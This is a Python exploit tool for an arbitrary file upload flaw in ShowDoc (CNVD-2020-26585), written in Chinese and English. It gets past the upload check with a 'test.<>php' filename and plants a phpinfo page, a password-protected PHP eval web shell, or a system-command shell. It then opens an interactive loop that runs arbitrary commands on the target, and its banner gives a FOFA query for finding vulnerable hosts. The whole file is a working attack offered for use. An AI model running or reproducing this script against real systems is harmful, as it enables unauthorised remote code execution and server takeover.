#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# @Author  : Cr4y0n
# @Software: PyCharm
# @Time    : 2021/5/12
# @Github  : https://github.com/Cr4y0nXX

import os
import json
import random
import string
import requests
from argparse import ArgumentParser

requests.packages.urllib3.disable_warnings()

class EXP:
    def __init__(self):
        self.banner()
        self.args = self.parseArgs()
        self.parseURL()
        print(f"timeout: {self.args.timeout}\n")
        self.hasVuln = False
        self.attack()

    def banner(self):
        logo = r"""
   _____ _                   _____             ______ _ _      _    _       _                 _ 
  / ____| |                 |  __ \           |  ____(_) |    | |  | |     | |               | |
 | (___ | |__   _____      _| |  | | ___   ___| |__   _| | ___| |  | |_ __ | | ___   __ _  __| |
  \___ \| '_ \ / _ \ \ /\ / / |  | |/ _ \ / __|  __| | | |/ _ \ |  | | '_ \| |/ _ \ / _` |/ _` |
  ____) | | | | (_) \ V  V /| |__| | (_) | (__| |    | | |  __/ |__| | |_) | | (_) | (_| | (_| |
 |_____/|_| |_|\___/ \_/\_/ |_____/ \___/ \___|_|    |_|_|\___|\____/| .__/|_|\___/ \__,_|\__,_|  EXP
                                                                     | |                        
                                                                     |_|               Author: Cr4y0n
        """
        msg = """
==================================================
| 漏洞名称 | ShowDoc任意文件上传漏洞
| 漏洞时间 | 2020-05-01 ？
| 影响版本 | ？
| 漏洞编号 | CNVD-2020-26585
| 漏洞文件 | index.php
| 漏洞地址 | /index.php?s=/home/page/uploadImg
| FOFA语句 | app="ShowDoc"
|-------------------------------------------------
| 脚本功能 | 上传phpinfo、php小马、执行任意系统命令
==================================================
        """
        print("\033[91m" + logo + "\033[0m")
        print(msg)

    def parseArgs(self):
        parser = ArgumentParser()
        parser.add_argument("-u", "--url", required=True, type=str, help=f"The target address, (ip:port) or url")
        parser.add_argument("-T", "--timeout", required=False, type=int, default=3,  help="request timeout(default 3)")
        parser.add_argument("--phpinfo", required=False, action="store_true",  help="create page of phpinfo")
        parser.add_argument("--osShell", required=False, action="store_true", default=True, help="default mod, create an os shell")
        parser.add_argument("--uploadTrojan", required=False, action="store_true", help="upload a php small trojan")
        return parser.parse_args()

    # 处理URL格式
    def parseURL(self):
        self.url = self.args.url
        if "https://" in self.url:
            self.url = self.url.replace("https://", "http://")
        if "http://" not in self.url:
            self.url = f"http://{self.url}"

    # 创建文件数据
    def createFileData(self, verify=False):
        if self.args.phpinfo or verify:
            payload = "<?php phpinfo();?>"
        elif self.args.uploadTrojan:
            print("\n")
            self.password = input("\033[42m" + "Input Passwd>" + "\033[0m" + " ")
            payload = f"<?php @eval($_POST[{self.password}])?>"
        else:
            self.password = "".join(random.sample(string.ascii_letters + string.digits, 8))
            payload = f"<?php @eval(system($_GET[{self.password}]))?>"
        fileData = [("editormd-image-file", ("test.<>php", payload, "text/plain"))]
        return fileData

    # 验证漏洞
    def verify(self, url):
        fileData = self.createFileData(verify=True)
        repData = self.exploitVuln(url, fileData)
        if "http://" in repData:
            msg = f"\033[32m[+] [ Vuln ]  {url}\033[0m"
            self.hasVuln = True
        elif "Conn" == repData:
            msg = f"\033[31m[!] [ Conn ]  {url}\033[0m"
        else:
            msg = f"[-] [ Safe ]  {url}"
        print(msg)
        if self.hasVuln:
            return repData
        return "False"

    # 利用漏洞 上传文件
    def exploitVuln(self, url, postData):
        reqURL = url + "/index.php?s=/home/page/uploadImg"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Accept-Encoding": "gzip"
        }
        try:
            rep = requests.post(url=reqURL, headers=headers, files=postData, timeout=self.args.timeout, verify=False)
            if rep.status_code == 200:
                try:
                    uploadResult = rep.json().get("url").replace("\\", "")
                    return uploadResult
                except:
                    return "uploadError"
            else:
                return "Safe"
        except:
            return "Conn"

    # 上传木马文件 执行命令
    def execCMD(self):
        fileData = self.createFileData()
        repData = self.exploitVuln(self.url, fileData)
        if "http" in repData:
            print(f"\n\033[36m[*] [ File ]  {repData}\033[0m")
            print(f"\033[36m[*] [ Pass ]  {self.password}\n\033[0m")
        cmd = ""
        reqURL = repData + f"?{self.password}={cmd}"
        while True:
            try:
                cmd = input("\033[42m" + "Input CMD>" + "\033[0m" + " ")
                reqURL = repData + f"?{self.password}={cmd}"
                rep = requests.get(url=reqURL, timeout=self.args.timeout, verify=False)
                if rep.status_code == 200:
                    print(rep.text.strip())
                else:
                    print("\n", "Error.", "\n")
            except KeyboardInterrupt:
                print("\n\nBye~\n")
                return
            except:
                print(f"\033[31m[!] [ Conn ]  {reqURL}\033[0m")

    # 攻击
    def attack(self):
        result = self.verify(self.url)
        if self.hasVuln:
            # 上传phpinfo页面
            if self.args.phpinfo:
                uploadResultPath = result
                print(f"\033[36m\n[*] [ File ]  {uploadResultPath}\n\033[0m")
            # 上传php小马
            elif self.args.uploadTrojan:
                fileData = self.createFileData()
                repData = self.exploitVuln(self.url, fileData)
                if "http" in repData:
                    print(f"\033[36m\n[*] [ File ]  {repData}\033[0m")
                    print(f"\033[36m[*] [ Pass ]  {self.password}\033[0m")
                    print(f"\033[36m[*] [ Meth ]  POST\n\033[0m")
            else:
                # 执行命令
                self.execCMD()
        else:
            pass

if __name__ == "__main__":
    EXP()
